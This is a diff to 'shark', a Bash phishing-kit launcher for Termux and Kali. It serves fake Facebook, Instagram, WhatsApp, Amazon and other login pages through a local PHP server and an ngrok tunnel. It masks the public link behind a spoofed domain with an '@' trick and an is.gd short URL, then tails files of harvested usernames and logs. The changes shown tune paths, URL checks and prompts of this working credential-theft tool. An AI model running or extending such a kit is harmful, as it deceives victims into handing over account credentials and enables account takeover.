@@ -1,4 +1,4 @@
-#!/data/data/com.termux/files/usr/bin/bash
+#!/bin/bash
 
 ##############################################
 #                                            #
@@ -24,6 +24,7 @@ green="\033[1;32m"                                          ##
 yellow="\033[1;33m"                                         ##
 purple="\033[0;35m"                                         ##
 cyan="\033[0;36m"                                           ##
+cyan1="\033[1;36m"                                          ##
 cafe="\033[0;33m"                                           ##
 fiuscha="\033[0;35m"                                        ##
 blue="\033[1;34m"                                           ##
@@ -36,7 +37,8 @@ nc="\033[0m"                                                ##
 
 VERSION="2.0.3"
 
-BIN="${PREFIX}/bin"
+## this is for only kali check for termux too
+BIN="/usr/bin"
 
 
 ################
@@ -80,14 +82,14 @@ spinner() {
 function os () {
 if [ -e $BIN/termux-info ]; then
                 BIN="${PREFIX}/bin"
-		php="${PREFIX}/share/phs"
+		php1="${PREFIX}/share/phs"
 		files="/sdcard"
 		shark="${PREFIX}/share/shark"
                 old_shark="${PREFIX}/bin/shark"
 		OS=TERMUX
 	else
 	        BIN="/usr/bin"
-	        php="/usr/share/phs"
+	        php1="/usr/share/shark/phs"
 		files="$HOME/Desktop"
 		shark="/usr/share/shark"
 		old_shark="/usr/bin/shark"
@@ -271,29 +273,29 @@ cat ip.txt >> saved.ip.txt
 function kill_ngrok() {
 php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
 ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
-kill -9 $php
-kill -9 $ngrok
+kill -9 $php > /dev/null 2>&1
+kill -9 $ngrok > /dev/null 2>&1
 }
 
 function url_checker() {
-if [ ! "${1//:*}" = http ] || [ ! "${1//:*}" = https ] ; then
+if [ ! "${1//:*}" = http ]; then
+	if [ ! "${1//:*}" = https ]; then
 printf "${red} Invalid URL. Please use http or https. \n "
 exit 1
+fi
 fi
 }
 
 # URL_SHORTNER
-function url_shortner() {	
-        printf "\n"
+function url_shortner() {    
 	# echo `wget -q -O - http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=${link}\&keyword=$2
         short=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${link})
-        shorter=${short#https://}
-        printf "\n"
-        read -p $'${blue} shark ${white}>> ${green}Mask Your url domain here ${yellow}: Ex. https://facebook.com : ${nc}\n ' mask
+        shorter=${short#https://}       
+        read -p $'\n\033[1;94mshark \033[1;97m>> \033[1;92mMask Your url domain here \033[1;93m(Ex. https://facebook.com) :\e[0m ' mask
         url_checker $mask	
-	printf "${blue} shark ${white}>> ${green}Enter your key words ${yellow}: Ex. free-insta-followers\n"        
-	printf "${blue} shark ${white}>> ${green} Don't use space in your words\n"	
-        read -p $'${blue} shark ${white}>> ${green}Enter your words here :${nc}\n ' words
+	printf "${blue}shark ${white}>> ${green}Enter your key words ${yellow}: Ex. free-insta-followers\n"        
+	printf "${blue}shark ${white}>> ${green}Don't use space in your words\n"	
+        read -p $'\e[1;94mshark \033[1;97m>> \e[1;92mEnter your words here :\e[0m ' words
         final_url=$mask-$words@$shorter
 	printf "$final_url\n"
 }
@@ -366,7 +368,7 @@ while [ true ]; do
 
 # MAIN 
 function main() {
-        launch="starting shark server";splashdown="started shark server";printf "\n";connection;php -S 127.0.0.1:4444 > /dev/null 2>&1 & sleep 2;ngrok http 4444 > /dev/null 2>&1 & sleep 20 & spinner;link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io");url_shortner;
+        launch="starting shark server";splashdown="started shark server";printf "\n";connection;php -S 127.0.0.1:4444 > /dev/null 2>&1 & sleep 6;ngrok http 4444 > /dev/null 2>&1 & sleep 20 & spinner;link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io");url_shortner;
 }
 
 while :
@@ -381,9 +383,9 @@ printf "${blue}
        ██████╔╝██║  ██║██║  ██║██║  ██║██║ ╚██╗
        ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ v ${VERSION}\n\n "
        
-printf $'${green}        =======================================\n'
-printf $'        ${l_red}    c r e a t e d  b y  a s h i s h    ${nc}\n '
-printf $'${green}        =======================================${nc}\n\n'
+printf "${green}        =======================================\n"
+printf "         ${l_red}    c r e a t e d  b y  a s h i s h    ${nc}\n "
+printf "${green}        =======================================${nc}\n\n"
 
 ###change banner ---- start here
 banner(){
@@ -400,7 +402,7 @@ printf "\e[1;31m[\e[0m\e[1;92m09\e[0m\e[1;31m] \e[0m\e[1;48;5;200mInsta-Follower
 printf "\e[1;31m[\e[0m\e[1;92m10\e[0m\e[1;31m] \e[0m\e[1;37;40mAmazon\e[0m             \e[1;31m[\e[0m\e[1;92m21\e[0m\e[1;31m] \e[0m\e[1;37;46mTwitter\e[0m           \e[1;31m[\e[0m\e[1;92m32\e[0m\e[1;31m] \e[0m\e[1;48;5;197mAudio_hack\e[m\n\n"
 printf "\e[1;31m[\e[0m\e[1;92m11\e[0m\e[1;31m] \e[0m\e[1;37;42mWhatsApp\e[0m           \e[1;31m[\e[0m\e[1;92m22\e[0m\e[1;31m] \e[0m\e[1;34;103mFlipcart\e[0m          \e[1;31m[\e[0m\e[1;92m99\e[0m\e[1;31m] \e[0m\e[1;91;102mExit\e[0m\n\n"
 printf "${purple}==================================================================${nc}\n\n"
-read -p $'${blue} shark ${white}>> ${green}Choose Your Option :${nc}\n ' option
+read -p $'\e[1;34mshark \e[1;97m>>\e[0m ' option
 }
 
 
@@ -414,7 +416,7 @@ banner
 	
          if [ $option = 01 ] || [ $option = 1 ]
          then
-	                    cd $php/facebook/ && main
+	                    cd ${php1}/facebook/ && main
 			    tail -f usernames.txt 
                             break;
 			     
@@ -426,7 +428,7 @@ banner
 
 	 elif [ $option = 03 ] || [ $option = 3 ]
 	 then
-		           cd $php/instagram/ && main			  
+		           cd ${php1}/instagram/ && main
 			   tail -f log.txt			   
                            break;
 			   
